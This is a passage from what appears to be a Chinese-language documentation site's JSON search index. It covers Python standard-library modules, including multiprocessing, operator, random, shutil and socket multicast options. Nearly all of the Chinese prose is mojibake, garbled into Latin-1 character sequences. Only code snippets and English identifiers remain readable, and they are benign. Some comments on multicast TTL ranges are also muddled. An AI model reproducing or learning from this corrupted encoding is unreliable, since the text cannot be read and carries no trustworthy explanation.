å¦‚æœå­è¿›ç¨‹ç”±äºåœ¨ run() å†…çš„æœªæ•è·å¼‚å¸¸è€Œç»ˆæ­¢ï¼Œé€€å‡ºä»£ç å°†æ˜¯ 1 ã€‚ å¦‚æœå®ƒæ˜¯ç”±ä¿¡å· N ç»ˆæ­¢çš„ï¼Œé€€å‡ºä»£ç å°†æ˜¯è´Ÿå€¼ -N ã€‚ sentinel ç³»ç»Ÿå¯¹è±¡çš„æ•°å­—å¥æŸ„ï¼Œå½“è¿›ç¨‹ç»“æŸæ—¶å°†å˜ä¸º \"ready\" ã€‚ å¦‚æœè¦ä½¿ç”¨ multiprocessing.connection.wait() ä¸€æ¬¡ç­‰å¾…å¤šä¸ªäº‹ä»¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤å€¼ã€‚å¦åˆ™è°ƒç”¨ join() æ›´ç®€å•ã€‚ åœ¨Windowsä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ“ä½œç³»ç»Ÿå¥æŸ„ï¼Œå¯ä»¥ä¸ WaitForSingleObject å’Œ WaitForMultipleObjects ç³»åˆ—APIè°ƒç”¨ä¸€èµ·ä½¿ç”¨ã€‚åœ¨Unixä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨æ¥è‡ª select æ¨¡å—çš„åŸè¯­ã€‚ 3.3 æ–°ç‰ˆåŠŸèƒ½. terminate() ç»ˆæ­¢è¿›ç¨‹ã€‚ åœ¨Unixä¸Šï¼Œè¿™æ˜¯ä½¿ç”¨ SIGTERM ä¿¡å·å®Œæˆçš„ï¼›åœ¨Windowsä¸Šä½¿ç”¨ TerminateProcess() ã€‚ è¯·æ³¨æ„ï¼Œä¸ä¼šæ‰§è¡Œé€€å‡ºå¤„ç†ç¨‹åºå’Œfinallyå­å¥ç­‰ã€‚ è¯·æ³¨æ„ï¼Œè¿›ç¨‹çš„åä»£è¿›ç¨‹å°†ä¸ä¼šè¢«ç»ˆæ­¢ â€”â€” å®ƒä»¬å°†ç®€å•åœ°å˜æˆå­¤ç«‹çš„ã€‚ è­¦å‘Š å¦‚æœåœ¨å…³è”è¿›ç¨‹ä½¿ç”¨ç®¡é“æˆ–é˜Ÿåˆ—æ—¶ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œåˆ™ç®¡é“æˆ–é˜Ÿåˆ—å¯èƒ½ä¼šæŸåï¼Œå¹¶å¯èƒ½æ— æ³•è¢«å…¶ä»–è¿›ç¨‹ä½¿ç”¨ã€‚ ç±»ä¼¼åœ°ï¼Œå¦‚æœè¿›ç¨‹å·²è·å¾—é”æˆ–ä¿¡å·é‡ç­‰ï¼Œåˆ™ç»ˆæ­¢å®ƒå¯èƒ½å¯¼è‡´å…¶ä»–è¿›ç¨‹æ­»é”ã€‚ kill() ä¸ terminate() ç›¸åŒï¼Œä½†åœ¨Unixä¸Šä½¿ç”¨ SIGKILL ä¿¡å·ã€‚ close() å…³é—­ Process å¯¹è±¡ï¼Œé‡Šæ”¾ä¸ä¹‹å…³è”çš„æ‰€æœ‰èµ„æºã€‚å¦‚æœåº•å±‚è¿›ç¨‹ä»åœ¨è¿è¡Œï¼Œåˆ™ä¼šå¼•å‘ ValueError ã€‚ä¸€æ—¦ close() æˆåŠŸè¿”å›ï¼Œ Process å¯¹è±¡çš„å¤§å¤šæ•°å…¶ä»–æ–¹æ³•å’Œå±æ€§å°†å¼•å‘ ValueError ã€‚ æ³¨è§£ æ³¨æ„ start() ã€ join() ã€ is_alive() ã€ terminate() å’Œ exitcode æ–¹æ³•åªèƒ½ç”±åˆ›å»ºè¿›ç¨‹å¯¹è±¡çš„è¿›ç¨‹è°ƒç”¨ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-multiprocessing.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-multiprocessing.html"},{"title":"operator","text":"ä¸¤ä¸ªä¾¿æ·ä½¿ç”¨çš„æ“ä½œ: import operator operator.itemgetter <class 'operator.itemgetter'> operator.attrgetter <class 'operator.attrgetter'> itemgetter, ä¾¿æ·è·å–å­—å…¸å±æ€§ attrgetter, ä¾¿æ·è·å–å¯¹è±¡å±æ€§ itemgetter æœ‰ä¸€ä¸ªå­—å…¸åˆ—è¡¨ï¼Œä½ æƒ³æ ¹æ®æŸä¸ªæˆ–æŸå‡ ä¸ªå­—å…¸å­—æ®µæ¥æ’åºè¿™ä¸ªåˆ—è¡¨: rows = [ {'fname': 'Brian', 'lname': 'Jones', 'uid': 1003}, {'fname': 'David', 'lname': 'Beazley', 'uid': 1002}, {'fname': 'John', 'lname': 'Cleese', 'uid': 1001}, {'fname': 'Big', 'lname': 'Jones', 'uid': 1004} ] from operator import itemgetter rows_by_fname = sorted(rows, key=itemgetter('fname')) rows_by_uid = sorted(rows, key=itemgetter('uid')) ä¹Ÿæ”¯æŒå¤šä¸ª keysï¼Œæ¯”å¦‚ä¸‹é¢çš„ä»£ç : rows_by_lfname = sorted(rows, key=itemgetter('lname','fname')) print(rows_by_lfname) ä¹Ÿå¯ä»¥ç”¨ lambda è¡¨è¾¾å¼ä»£æ›¿ï¼Œæ¯”å¦‚: rows_by_fname = sorted(rows, key=lambda r: r['fname']) rows_by_lfname = sorted(rows, key=lambda r: (r['lname'],r['fname'])) ä½†æ˜¯æ•ˆç‡è¾ƒä½ attrgetter ä¸ä¸Šç±»ä¼¼. æ”¯æŒçš„æ˜¯è‡ªå®šä¹‰å¯¹è±¡ æ€»è§ˆ éƒ¨åˆ†æ€»è§ˆ: operator.lt(a, b) operator.le(a, b) operator.eq(a, b) operator.ne(a, b) operator.ge(a, b) operator.gt(a, b) operator.__lt__(a, b) operator.__le__(a, b) operator.__eq__(a, b) operator.__ne__(a, b) operator.__ge__(a, b) operator.__gt__(a, b)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-operator.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-operator.html"},{"title":"pprint","text":"pprint --- æ•°æ®ç¾åŒ–è¾“å‡º å®˜ç½‘: https://docs.python.org/zh-cn/3/library/pprint.html é’ˆå¯¹ json æ ¼å¼æ•°æ®çš„ç¾åŒ–æ‰“å°å·¥å…· pprint æ¨¡å—æä¾›äº†\"ç¾åŒ–æ‰“å°\"ä»»æ„ Python æ•°æ®ç»“æ„çš„åŠŸèƒ½ï¼Œè¿™ç§ç¾åŒ–å½¢å¼å¯ç”¨ä½œå¯¹è§£é‡Šå™¨çš„è¾“å…¥ã€‚ å¦‚æœç»æ ¼å¼åŒ–çš„ç»“æ„åŒ…å«éåŸºæœ¬ Python ç±»å‹çš„å¯¹è±¡ï¼Œåˆ™å…¶ç¾åŒ–å½¢å¼å¯èƒ½æ— æ³•è¢«åŠ è½½ã€‚ åŒ…å«æ–‡ä»¶ã€å¥—æ¥å­—æˆ–ç±»å¯¹è±¡ï¼Œä»¥åŠè®¸å¤šå…¶ä»–ä¸èƒ½ç”¨ Python å­—é¢å€¼æ¥è¡¨ç¤ºçš„å¯¹è±¡éƒ½æœ‰å¯èƒ½å¯¼è‡´è¿™æ ·çš„ç»“æœã€‚ PrettyPrinter","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pprint.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pprint.html"},{"title":"pytz","text":"æ—¶åŒºæ“ä½œçš„åº“","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-pytz.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-pytz.html"},{"title":"random","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/random.html ç”Ÿæˆä¼ªéšæœºæ•° è¯¥æ¨¡å—å®ç°äº†å„ç§åˆ†å¸ƒçš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€‚ å¯¹äºæ•´æ•°ï¼Œä»èŒƒå›´ä¸­æœ‰ç»Ÿä¸€çš„é€‰æ‹©ã€‚ å¯¹äºåºåˆ—ï¼Œå­˜åœ¨éšæœºå…ƒç´ çš„ç»Ÿä¸€é€‰æ‹©ã€ç”¨äºç”Ÿæˆåˆ—è¡¨çš„éšæœºæ’åˆ—çš„å‡½æ•°ã€ä»¥åŠç”¨äºéšæœºæŠ½æ ·è€Œæ— éœ€æ›¿æ¢çš„å‡½æ•°ã€‚ åœ¨å®æ•°è½´ä¸Šï¼Œæœ‰è®¡ç®—å‡åŒ€ã€æ­£æ€ï¼ˆé«˜æ–¯ï¼‰ã€å¯¹æ•°æ­£æ€ã€è´ŸæŒ‡æ•°ã€ä¼½é©¬å’Œè´å¡”åˆ†å¸ƒçš„å‡½æ•°ã€‚ ä¸ºäº†ç”Ÿæˆè§’åº¦åˆ†å¸ƒï¼Œå¯ä»¥ä½¿ç”¨ von Mises åˆ†å¸ƒã€‚ è¿™ä¸ªæ¨¡å—æä¾›çš„å‡½æ•°å®é™…ä¸Šæ˜¯ random.Random ç±»çš„éšè—å®ä¾‹çš„ç»‘å®šæ–¹æ³•ã€‚ ä½ å¯ä»¥å®ä¾‹åŒ–è‡ªå·±çš„ Random ç±»å®ä¾‹ä»¥è·å–ä¸å…±äº«çŠ¶æ€çš„ç”Ÿæˆå™¨ã€‚ random æ¨¡å—è¿˜æä¾› SystemRandom ç±»ï¼Œå®ƒä½¿ç”¨ç³»ç»Ÿå‡½æ•° os.urandom() ä»æ“ä½œç³»ç»Ÿæä¾›çš„æºç”Ÿæˆéšæœºæ•°ã€‚ è­¦å‘Š ä¸åº”å°†æ­¤æ¨¡å—çš„ä¼ªéšæœºç”Ÿæˆå™¨ç”¨äºå®‰å…¨ç›®çš„ã€‚ æœ‰å…³å®‰å…¨æ€§æˆ–åŠ å¯†ç”¨é€”ï¼Œè¯·å‚é˜… /docs/åç«¯/python/pythonæ ‡å‡†åº“/secrets æ¨¡å—ã€‚ åŠŸèƒ½/çŠ¶æ€ ç”¨äºå­—èŠ‚æ•°æ®çš„å‡½æ•° æ•´æ•°ç”¨å‡½æ•° è¿”å›éšæœºæ•´æ•° N æ»¡è¶³ a <= N <= bã€‚ç›¸å½“äº randrange(a, b+1)ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-random.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-random.html"},{"title":"resource","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/resource.html èµ„æºä½¿ç”¨ä¿¡æ¯ è¯¥æ¨¡å—æä¾›äº†æµ‹é‡å’Œæ§åˆ¶ç¨‹åºæ‰€åˆ©ç”¨çš„ç³»ç»Ÿèµ„æºçš„åŸºæœ¬æœºåˆ¶ã€‚ èµ„æºé™åˆ¶ èµ„æºçš„ä½¿ç”¨å¯ä»¥é€šè¿‡ä¸‹é¢æè¿°çš„ setrlimit() å‡½æ•°æ¥é™åˆ¶ã€‚æ¯ä¸ªèµ„æºéƒ½è¢«ä¸€å¯¹é™åˆ¶æ‰€æ§åˆ¶ï¼š ä¸€ä¸ªè½¯é™åˆ¶å’Œä¸€ä¸ªç¡¬é™åˆ¶ã€‚è½¯é™åˆ¶æ˜¯å½“å‰çš„é™åˆ¶ï¼Œå¹¶ä¸”å¯ä»¥ç”±ä¸€ä¸ªè¿›ç¨‹éšç€æ—¶é—´çš„æ¨ç§»è€Œé™ä½æˆ–æé«˜ã€‚ è½¯é™åˆ¶æ°¸è¿œä¸èƒ½è¶…è¿‡ç¡¬é™åˆ¶ã€‚ç¡¬é™åˆ¶å¯ä»¥é™ä½åˆ°å¤§äºè½¯é™åˆ¶çš„ä»»ä½•æ•°å€¼ï¼Œä½†ä¸èƒ½æé«˜ã€‚ ï¼ˆåªæœ‰æ‹¥æœ‰è¶…çº§ç”¨æˆ·æœ‰æ•ˆUIDçš„è¿›ç¨‹æ‰èƒ½æé«˜ç¡¬é™åˆ¶ã€‚) å¯ä»¥è¢«é™åˆ¶çš„å…·ä½“èµ„æºå–å†³äºç³»ç»Ÿã€‚å®ƒä»¬åœ¨ man getrlimit(2) ä¸­æè¿°ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-resource.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-resource.html"},{"title":"shutil","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/shutil.html é«˜é˜¶æ–‡ä»¶æ“ä½œ shutil æ¨¡å—æä¾›äº†ä¸€ç³»åˆ—å¯¹æ–‡ä»¶å’Œæ–‡ä»¶é›†åˆçš„é«˜é˜¶æ“ä½œã€‚ ç‰¹åˆ«æ˜¯æä¾›äº†ä¸€äº›æ”¯æŒæ–‡ä»¶æ‹·è´å’Œåˆ é™¤çš„å‡½æ•°ã€‚ å¯¹äºå•ä¸ªæ–‡ä»¶çš„æ“ä½œï¼Œè¯·å‚é˜… os æ¨¡å—ã€‚ ä¸€äº›å¸¸ç”¨ copy, æ–‡ä»¶çš„å¤åˆ¶, å¤åˆ¶æ—¶, å¦‚æœæ˜¯è½¯é“¾, ä¼šè‡ªåŠ¨æ‰¾åˆ°çœŸå®çš„æºæ–‡ä»¶, ç„¶åæŠŠæºæ–‡ä»¶å¤åˆ¶è¿‡æ¥, æ–°çš„æ–‡ä»¶åä¸è½¯é“¾åä¿æŒä¸€è‡´, å¯ä½¿ç”¨ follow_symlinks=False è¾¾åˆ°ä¸ copy2 ä¸€è‡´ copy2, æ–‡ä»¶çš„å¤åˆ¶, å¤åˆ¶æ—¶, å¦‚æœæ˜¯è½¯é“¾, ä»…å¤åˆ¶æ­¤è½¯é“¾ copy_tree, ç›®å½•çš„å¤åˆ¶","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-shutil.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-shutil.html"},{"title":"site","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/site.html è·å–æœ¬åœ°ä¸‰æ–¹åŒ…è·¯å¾„: $ python3 -m site --user-site /home/user/.local/lib/python3.3/site-packages --user-base è¾“å‡ºç”¨æˆ·åŸºæœ¬çš„è·¯å¾„ã€‚ --user-site è¾“å‡ºç”¨æˆ·site-packagesç›®å½•çš„è·¯å¾„ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-site.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-site.html"},{"title":"socket","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/socket.html åº•å±‚ç½‘ç»œæ¥å£ æä¾›äº†è®¿é—® BSD å¥—æ¥å­— çš„æ¥å£ã€‚åœ¨æ‰€æœ‰ç°ä»£ Unix ç³»ç»Ÿã€Windowsã€macOS å’Œå…¶ä»–ä¸€äº›å¹³å°ä¸Šå¯ç”¨ã€‚ å¥—æ¥å­—åè®®ç°‡ ä»…ä»‹ç»å¸¸ç”¨çš„ ipv4ä¸ipv6ç›¸å…³åœ°å€åè®®ç°‡ ä¸€å¯¹ (host, port) è¢«ç”¨ä½œ AF_INET åœ°å€æ—ï¼Œå…¶ä¸­ host æ˜¯ä¸€ä¸ªè¡¨ç¤ºäº’è”ç½‘åŸŸåæ ‡è®°å½¢å¼çš„ä¸»æœºåä¾‹å¦‚ 'daring.cwi.nl' æˆ–è€… IPv4 åœ°å€ä¾‹å¦‚ '100.50.200.5' çš„å­—ç¬¦ä¸²ï¼Œè€Œ port æ˜¯ä¸€ä¸ªæ•´æ•°å€¼ã€‚ å¯¹äº IPv4 åœ°å€ï¼Œæœ‰ä¸¤ç§å¯æ¥å—çš„ç‰¹æ®Šå½¢å¼è¢«ç”¨æ¥ä»£æ›¿ä¸€ä¸ªä¸»æœºåœ°å€ï¼š'' ä»£è¡¨ INADDR_ANYï¼Œç”¨æ¥ç»‘å®šåˆ°æ‰€æœ‰æ¥å£ï¼› å­—ç¬¦ä¸² '<broadcast>' ä»£è¡¨ INADDR_BROADCASTã€‚ æ­¤è¡Œä¸ºä¸å…¼å®¹ IPv6ï¼Œå› æ­¤ï¼Œå¦‚æœä½ çš„ Python ç¨‹åºæ‰“ç®—æ”¯æŒ IPv6ï¼Œåˆ™å¯èƒ½éœ€è¦é¿å¼€è¿™äº›ã€‚ å¯¹äº AF_INET6 åœ°å€æ—ï¼Œä½¿ç”¨ä¸€ä¸ªå››å…ƒç»„ (host, port, flowinfo, scope_id)ï¼Œ å…¶ä¸­ flowinfo å’Œ scope_id ä»£è¡¨äº† C åº“ struct sockaddr_in6 ä¸­çš„ sin6_flowinfo å’Œ sin6_scope_id æˆå‘˜ã€‚ å¯¹äº socket æ¨¡å—ä¸­çš„æ–¹æ³•ï¼Œ flowinfo å’Œ scope_id å¯ä»¥è¢«çœç•¥ï¼Œåªä¸ºäº†å‘åå…¼å®¹ã€‚ æ³¨æ„ï¼Œçœç•¥ scope_id å¯èƒ½ä¼šå¯¼è‡´æ“ä½œå¸¦æœ‰é¢†åŸŸ (Scope) çš„ IPv6 åœ°å€æ—¶å‡ºé”™ã€‚ setsockopt setsockopt()æ–¹æ³•ç”¨æ¥è®¾ç½®å¥—æ¥å­—é€‰é¡¹,å®ƒæœ‰ä»¥ä¸‹å‚æ•°: level:é€‰é¡¹çº§åˆ«,ç”¨äºåŒºåˆ†æ˜¯é’ˆå¯¹å¥—æ¥å­—çº§åˆ«çš„é€‰é¡¹è¿˜æ˜¯æŸä¸ªå…·ä½“åè®®çº§åˆ«çš„é€‰é¡¹ã€‚socket.SOL_SOCKETè¡¨ç¤ºå¥—æ¥å­—çº§åˆ«ã€‚ optname:é€‰é¡¹åç§°, å¦‚socket.SO_BROADCAST,è¡¨ç¤ºå¹¿æ’­é€‰é¡¹ã€‚ æ”¯æŒçš„å€¼: levelä¸ºSOL_SOCKET:è®¾ç½®å¥—æ¥å­—çº§åˆ«çš„é€‰é¡¹ã€‚åŒ…æ‹¬: SO_REUSEADDR:å…è®¸é‡ç”¨æœ¬åœ°åœ°å€å’Œç«¯å£ã€‚ æ¯”å¦‚å½“ä¸Šä¸€ä¸ªå¥—æ¥å­—å…³é—­æ—¶ç«‹å³å†å¯åŠ¨, ä¼šå‘ç°æŠ¥é”™ç«¯å£å·²å ç”¨. è¿™æ˜¯å› ä¸ºä¸Šä¸€æ¬¡å…³é—­æ—¶, å…¶å¤„äº TIME_WAIT çŠ¶æ€ï¼Œæ— æ³•ç«‹å³é‡ç”¨, è®¾ç½®æ­¤é€‰é¡¹å³å¯ç«‹å³é‡ç”¨. SO_REUSEPORT: å…è®¸å¤šä¸ªå¥—æ¥å­—ç»‘å®šåˆ°åŒä¸€ä¸ªåœ°å€å’Œç«¯å£ã€‚ æ™®é€šçš„å¥—æ¥å­—ç»‘å®šè¦æ±‚åœ°å€å’Œç«¯å£å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚å¦‚æœæœ‰ä¸¤ä¸ªå¥—æ¥å­—å°è¯•ç»‘å®šåˆ°åŒä¸€åœ°å€å’Œç«¯å£,ç¬¬äºŒä¸ªç»‘å®šè°ƒç”¨å°†å¤±è´¥ã€‚ SO_KEEPALIVE:å¼€å¯TCP keepaliveæœºåˆ¶ã€‚ SO_SNDBUF / SO_RCVBUF:è®¾ç½®å‘é€/æ¥æ”¶ç¼“å†²åŒºå¤§å°ã€‚ SO_LINGER:æ§åˆ¶å¥—æ¥å­—å…³é—­æ—¶æœªå‘é€çš„æ•°æ®ã€‚ SO_OOBINLINE:å…è®¸æ¥æ”¶å¸¦å¤–æ•°æ®ã€‚ SO_BROADCAST: å…è®¸å¥—æ¥å­—å‘é€å¹¿æ’­æ•°æ®åŒ…ã€‚è¿™åœ¨ç¼–å†™åŸºäºUDPçš„å¹¿æ’­ç¨‹åºæ—¶éœ€è¦è®¾ç½® SO_ERROR: è·å–æˆ–è®¾ç½®å¥—æ¥å­—çš„é”™è¯¯çŠ¶æ€ã€‚å½“ä¸€ä¸ªå¥—æ¥å­—å‡ºç°é”™è¯¯æ—¶ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œè¡¨ç¤ºè¯¥å¥—æ¥å­—ä¸Šå‘ç”Ÿäº†é”™è¯¯ã€‚ è¿™ä¸ªé”™è¯¯çŠ¶æ€å¯ä»¥é€šè¿‡ socket.getsockopt() å’Œ socket.setsockopt() æ¥è·å–å’Œè®¾ç½®ã€‚ å¸¸è§çš„é”™è¯¯çŠ¶æ€åŒ…æ‹¬è¿æ¥è¢«æ‹’ç»ã€è¶…æ—¶ã€ä¸»æœºåæ— æ³•è§£æç­‰ levelä¸ºIPPROTO_IP / IPPROTO_TCP:è®¾ç½®IP/TCPçº§åˆ«çš„é€‰é¡¹ã€‚åŒ…æ‹¬: IP_TOS:è®¾ç½®IPæ•°æ®åŒ…çš„æœåŠ¡ç±»å‹ã€‚ TCP_NODELAY:ç¦ç”¨Nagleç®—æ³•,ç«‹å³å‘é€æ•°æ®ã€‚ IP_MULTICAST_TTL: è®¾ç½®IPå¤šæ’­æ•°æ®åŒ…çš„å­˜æ´»æ—¶é—´TTLã€‚å®ƒæ§åˆ¶å¤šæ’­æ•°æ®åŒ…å¯ä»¥è·¨è¿‡çš„è·¯ç”±å™¨æ•°é‡. IP_MULTICAST_TTLé€‰é¡¹çš„å€¼ç¡®å®åªèƒ½åœ¨0åˆ°255ä¹‹é—´ã€‚ å®ƒè¡¨ç¤ºIPå¤šæ’­æ•°æ®åŒ…å¯ä»¥è·¨è¶Šçš„è·¯ç”±å™¨æ•°é‡ã€‚æ¯ä¸ªè·¯ç”±å™¨è·¨è¶Šæ—¶,è¯¥å€¼å‡ä¸€ã€‚å½“å€¼å‡è‡³0æ—¶,è¯¥æ•°æ®åŒ…å°†ä¸å†è¢«è½¬å‘ã€‚ æ‰€ä»¥,è¯¥é€‰é¡¹çš„å€¼è¶Šå¤§,å¤šæ’­æ•°æ®åŒ…å¯ä»¥ä¼ è¾“çš„è·ç¦»è¶Šè¿œã€‚å¸¸ç”¨çš„å€¼æœ‰: 1:åŒä¸€å­ç½‘å†…ã€‚åªå…è®¸å¤šæ’­æ•°æ®åŒ…åœ¨æœ¬åœ°ç½‘ç»œå†…ä¼ è¾“ã€‚ 32:åŒä¸€ç«™ç‚¹å†…ã€‚å…è®¸è·¨è¶Šè¾ƒå¤§èŒƒå›´,å¯è¦†ç›–å¤§å¤šæ•°æœºæˆ¿æˆ–æ ¡å›­ç½‘ã€‚ 64:åŒä¸€åœ°åŸŸå†…ã€‚å¯ä»¥è¦†ç›–è¾ƒå¤§èŒƒå›´çš„åœ°åŒºç½‘ç»œã€‚ 128æˆ–æ›´å¤§:æ›´å¹¿èŒƒå›´çš„è¦†ç›–,ç”šè‡³è·¨æ´²é™…ã€‚ è€Œ0å€¼è¡¨ç¤ºç¦æ­¢å¤šæ’­æ•°æ®åŒ…è½¬å‘,å®ƒå°†è¢«ä¸¢å¼ƒè€Œä¸ç¦»å¼€æœ¬åœ°ä¸»æœºã€‚ æ‰€ä»¥,å¯¹äºè¿™ä¸ªé€‰é¡¹,æ¨èçš„å€¼ä¸€èˆ¬ä¸º: 1-32:å±€åŸŸç½‘/æœºæˆ¿å†…å¤šæ’­ã€‚ 64-128:å¹¿åŸŸç½‘å¤šæ’­ã€‚ 0:ç¦æ­¢å¤šæ’­æ•°æ®åŒ…è½¬å‘,æœ¬åœ°å›ç¯ã€‚ æ­£ç¡®è®¾ç½®è¿™ä¸ªå€¼,å¯ä»¥æ§åˆ¶å¤šæ’­æ•°æ®åŒ…çš„ä¼ æ’­èŒƒå›´,å®ç°æˆ‘ä»¬æƒ³è¦çš„å¤šæ’­è¦†ç›–é¢ã€‚ eg, å½“å€¼ä¸º2æ—¶: è¡¨ç¤ºå¤šæ’­æ•°æ®åŒ…å¯ä»¥åœ¨å½“å‰å­ç½‘åŠç›´æ¥ç›¸é‚»çš„ä¸€ä¸ªå­ç½‘ä¼ è¾“,ä½†ä¸å…è®¸ä¼ è¾“åˆ°æ›´è¿œçš„ç½‘ç»œã€‚ å®ƒå…è®¸åŒ…æ‹¬ç¬¬ä¸€ä¸ªè·¨è·¯ç”±å™¨è·³è·ƒåœ¨å†…çš„ä¸¤æ¬¡è·¯ç”±ã€‚å½“IPå¤šæ’­æ•°æ®åŒ…ç¦»å¼€æºä¸»æœºå,å®ƒå¯ä»¥è·¨è¶Šç¬¬ä¸€ä¸ªè·¯ç”±å™¨,æ­¤æ—¶TTLå€¼å‡ä¸€å˜ä¸º1ã€‚ ç„¶ååœ¨ç¬¬äºŒä¸ªè·¯ç”±å™¨,TTLå€¼å†å‡ä¸€å˜ä¸º0ã€‚æ­¤æ—¶,è¯¥è·¯ç”±å™¨å°†ä¸å†è½¬å‘è¿™ä¸ªæ•°æ®åŒ…,ä¸”å°†å…¶ä¸¢å¼ƒã€‚ IP_MULTICAST_LOOP: æ§åˆ¶æ˜¯å¦å‘æœ¬åœ°å¥—æ¥å­—å‘é€å›ç¯å¤šæ’­æ•°æ®åŒ…ã€‚ é»˜è®¤æƒ…å†µä¸‹,IPå¤šæ’­æ•°æ®åŒ…ä¼šå›ç¯åˆ°æœ¬åœ°,ä½†åœ¨æŸäº›æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦ç¦ç”¨æ­¤åŠŸèƒ½ã€‚ IPPROTO_IPV6:è®¾ç½®IPv6ç›¸å…³çš„é€‰é¡¹ã€‚ value:é€‰é¡¹å€¼,1è¡¨ç¤ºå…è®¸,0è¡¨ç¤ºç¦æ­¢ã€‚ å¦‚å…è®¸UDPå¥—æ¥å­—udp_serverå‘é€å’Œæ¥æ”¶å¹¿æ’­æ•°æ®åŒ…: udp_server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) å¦‚æœä¸è®¾ç½®è¿™ä¸ªé€‰é¡¹,é»˜è®¤æƒ…å†µä¸‹å¥—æ¥å­—æ˜¯ä¸å…è®¸å¹¿æ’­çš„ã€‚è®¾ç½®å,å¥—æ¥å­—å¯ä»¥: ä½¿ç”¨udp_server.sendto(data, (\"<broadcast>\", port)) å‘é€å¹¿æ’­ ä½¿ç”¨udp_server.recvfrom(bufsize) æ¥æ”¶å¹¿æ’­ eg: # è®¾ç½®socketé€‰é¡¹ï¼Œå¼€å¯å¹¿æ’­æ¨¡å¼ # å…è®¸åœ°å€é‡ç”¨, å¯ä»¥åœ¨åŒä¸€ä¸ªç«¯å£ä¸Šç»‘å®šå¤šä¸ªå¥—æ¥å­— sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1) # å¯ç”¨å¹¿æ’­æ¨¡å¼ï¼Œå¯ä»¥å‘æœ¬åœ°ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºå‘é€å¹¿æ’­æ¶ˆæ¯ sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1) # å€¼è®¾ç½®ä¸º2ï¼Œè¡¨ç¤ºä¼ è¾“èŒƒå›´ä¸ºæœ¬åœ°å­ç½‘ï¼Œ # ä¹Ÿå°±æ˜¯è¯´ï¼ŒUDPæ•°æ®åŒ…åªä¼šè¢«å‘é€åˆ°ä¸æœ¬åœ°ç½‘ç»œç›¸è¿çš„ä¸»æœº sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2) # å€¼è®¾ç½®ä¸º1, å¯ç”¨IPå¤šæ’­å›é€åŠŸèƒ½ï¼Œå…è®¸ä¸»æœºæ¥æ”¶è‡ªå·±å‘é€çš„IPå¤šæ’­æ•°æ®æŠ¥ sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 1) # ç»‘å®šIPåœ°å€å’Œç«¯å£å· sock.bind(cls._SSDP_Addr) # åŠ å…¥å¤šæ’­ç»„ # groupå˜é‡å­˜å‚¨å¤šæ’­åœ°å€, inet_aton()æ–¹æ³•å°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼ group = socket.inet_aton(cls._SSDP_Addr[0]) # å°†è¯¥åœ°å€å’ŒINADDR_ANYä¸€èµ·æ‰“åŒ… mreq = struct.pack('4sL', group, socket.INADDR_ANY) # å°†socketåŠ å…¥åˆ°æŒ‡å®šçš„å¤šæ’­ç»„ä¸­ sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) inet_aton ä¸€äº›å¸¸é‡ socket.INADDR_ANY: ä¸€ä¸ªå¸¸ç”¨çš„ç‰¹æ®Šå€¼,å®ƒè¡¨ç¤º: 0.0.0.0, å³æ‰€æœ‰æœ¬åœ°IPåœ°å€ã€‚ socket.IP_ADD_MEMBERSHIP: è®©å¥—æ¥å­—åŠ å…¥æŒ‡å®šçš„IPå¤šæ’­ç»„,ä»è€Œæ¥æ”¶è¯¥ç»„çš„æ•°æ®åŒ… socket.SOCK_DGRAMè¡¨ç¤ºä½¿ç”¨UDPæ•°æ®æŠ¥å¥—æ¥å­—ã€‚ socket.AF_INETè¡¨ç¤ºä½¿ç”¨IPv4åœ°å€æ—ã€‚ å°†udp-socketåŠ å…¥å¤šæ’­ç»„ åŠ å…¥å¤šæ’­ç»„ groupå˜é‡å­˜å‚¨å¤šæ’­åœ°å€, inet_aton()æ–¹æ³•å°†å…¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ ¼å¼: group = socket.inet_aton(cls._SSDP_Addr[0]) å°†è¯¥åœ°å€å’ŒINADDR_ANYä¸€èµ·æ‰“åŒ…æˆä¸€ä¸ª4å­—èŠ‚å­—ç¬¦ä¸²åŠ 